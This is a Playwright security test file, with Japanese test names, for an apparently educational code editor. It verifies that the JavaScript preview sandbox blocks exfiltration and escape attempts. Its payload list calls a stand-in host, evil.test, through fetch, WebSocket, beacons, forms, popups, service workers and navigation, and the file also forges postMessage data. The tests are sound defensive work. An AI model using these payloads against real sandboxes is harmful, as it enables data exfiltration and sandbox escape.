import { expect, test, type Page } from '@playwright/test';
import {
  JAVASCRIPT_SOLUTION_SOURCE,
  openEditableJavaScriptExercise,
} from './helpers/javascriptCourse';
import {
  observeStableTopUrl,
  observeRuntimePage,
  readRuntimeErrors,
} from './helpers/openRuntimeFixture';
import { editorText, replaceEditorText, waitForStoredDraftContent } from './helpers/progress';

const capabilityPayloads = [
  ['fetch', "fetch('https://evil.test/fetch');"],
  ['XMLHttpRequest', "new XMLHttpRequest().open('GET', 'https://evil.test/xhr');"],
  ['WebSocket', "new WebSocket('wss://evil.test/socket');"],
  ['Beacon', "navigator.sendBeacon('https://evil.test/beacon', 'x');"],
  ['image', "new Image().src = 'https://evil.test/image.png';"],
  [
    'form insertion',
    `document.querySelector('body').innerHTML = '<form action="https://evil.test/form"></form>';`,
  ],
  ['popup', "open('https://evil.test/popup');"],
  ['top/parent', "self.parent.postMessage('forged', '*');"],
  ['Storage', "localStorage.setItem('tsumucode-security-canary', 'pwned');"],
  ['Service Worker', "navigator.serviceWorker.register('https://evil.test/sw.js');"],
  ['self navigation', "window.location = 'https://evil.test/navigation';"],
] as const;

/** 選択中Fileを書き換え、同じ内容がIndexedDBへ保存されるまで待つ。 */
async function replaceAndSave(page: Page, source: string): Promise<void> {
  await replaceEditorText(page, source);
  await waitForStoredDraftContent(page, source);
}

test.beforeEach(async ({ page }) => {
  await observeRuntimePage(page);
  await openEditableJavaScriptExercise(page);
});

test.afterEach(async ({ page }) => {
  await expect(readRuntimeErrors(page)).resolves.toEqual({
    pageErrors: [],
    unhandledRejections: [],
    consoleErrors: [],
  });
});

test('JavaScript Capability payloadをfail-closedで拒否し、親画面と外部通信を守る', async ({
  page,
}) => {
  const externalRequests: string[] = [];
  const popups: Page[] = [];
  page.on('request', (request) => {
    if (request.url().includes('evil.test')) externalRequests.push(request.url());
  });
  page.on('popup', (popup) => {
    popups.push(popup);
  });
  const originalUrl = page.url();
  await page.evaluate(() => {
    document.body.dataset.javascriptSecurityCanary = 'intact';
    localStorage.setItem('tsumucode-security-canary', 'intact');
  });

  try {
    for (const [name, source] of capabilityPayloads) {
      await test.step(name, async () => {
        await replaceAndSave(page, source);
        const update = page.getByRole('button', { name: 'プレビューを更新' });
        await update.click();
        await expect(update).toBeEnabled();
        await expect(page.getByRole('list', { name: 'コード診断' })).toBeVisible();
        await expect.poll(() => editorText(page)).toBe(source);
        expect(await observeStableTopUrl(page, originalUrl)).toBe(true);
        expect(
          await page.evaluate(() => ({
            canary: document.body.dataset.javascriptSecurityCanary ?? null,
            storage: localStorage.getItem('tsumucode-security-canary'),
          })),
        ).toEqual({ canary: 'intact', storage: 'intact' });
        expect(externalRequests, `${name}から外部requestを発生させない`).toEqual([]);
        expect(popups, `${name}からpopupを開かない`).toEqual([]);
      });
    }

    await page.evaluate(() => {
      window.dispatchEvent(
        new MessageEvent('message', {
          source: window,
          data: {
            version: 1,
            type: 'javascript.execution-complete',
            exerciseSessionId: 'forged-session',
            executionRevision: 999,
            requestId: 'execution',
            oneTimeToken: 'stale-token',
            payload: {
              executed: true,
              budgetExhausted: false,
              timerLimitExceeded: false,
              runtimeError: null,
            },
          },
        }),
      );
    });
    expect(page.url()).toBe(originalUrl);

    await replaceAndSave(page, JAVASCRIPT_SOLUTION_SOURCE);
    await page.getByRole('button', { name: 'プレビューを更新' }).click();
    await expect(
      page
        .getByTestId('runtime-preview-frame')
        .locator('iframe')
        .contentFrame()
        .getByRole('heading', { name: 'JavaScriptで文字を変えました' }),
    ).toBeVisible();
  } finally {
    await Promise.all(popups.map((popup) => popup.close().catch(() => undefined)));
  }
});

test('HTMLの外部image・form・popup導線を除き、script.jsだけを安全な別経路で実行する', async ({
  page,
}) => {
  const externalRequests: string[] = [];
  const popups: Page[] = [];
  page.on('request', (request) => {
    if (request.url().includes('evil.test')) externalRequests.push(request.url());
  });
  page.on('popup', (popup) => {
    popups.push(popup);
  });
  const originalUrl = page.url();
  const htmlPayload = `<!doctype html>
<html lang="ja">
  <body>
    <main><h1 id="message">安全</h1></main>
    <img src="https://evil.test/image.png" alt="外部画像">
    <form action="https://evil.test/form" method="post">
      <button formaction="https://evil.test/override">送信</button>
    </form>
    <a href="https://evil.test/popup" target="_blank">外部Link</a>
    <script src="script.js"></script>
  </body>
</html>`;

  try {
    await page.getByRole('tab', { name: 'index.html', exact: true }).click();
    await replaceAndSave(page, htmlPayload);
    await page.getByRole('button', { name: 'プレビューを更新' }).click();
    const frame = page.getByTestId('runtime-preview-frame').locator('iframe').contentFrame();
    await expect(frame.getByRole('heading', { name: 'ここを書き換えます' })).toBeVisible();
    await expect(frame.getByRole('img', { name: '外部画像' })).not.toHaveAttribute('src');
    await expect(frame.locator('form')).not.toHaveAttribute('action');
    await expect(frame.locator('form')).not.toHaveAttribute('method');
    await expect(frame.getByRole('button', { name: '送信' })).not.toHaveAttribute('formaction');
    await expect(frame.getByRole('link', { name: '外部Link' })).not.toHaveAttribute('target');
    expect(await observeStableTopUrl(page, originalUrl)).toBe(true);
    expect(externalRequests).toEqual([]);
    expect(popups).toEqual([]);
  } finally {
    await Promise.all(popups.map((popup) => popup.close().catch(() => undefined)));
  }
});
